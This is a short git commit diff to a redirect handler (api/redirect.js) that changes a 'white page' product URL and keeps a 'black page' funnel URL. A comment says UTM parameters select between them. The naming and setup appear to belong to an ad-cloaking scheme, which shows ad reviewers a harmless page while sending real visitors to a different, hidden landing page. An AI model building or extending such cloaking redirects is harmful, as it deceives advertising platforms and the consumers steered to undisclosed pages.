fe7fd89affe84cab82562925f89c641611c2fcda
mahadzmn <mahadzaman05@gmail.com>
2025-02-03 10:25:42 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://cheekywinx.com/products/pearl-thermal-water-bottle-950ml-free-silicone-bumper";
+    const whitePageURL = "https://atoms.com/products/atoms-model-001-black-white";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
   
     // Parse the UTM parameters from the request URL
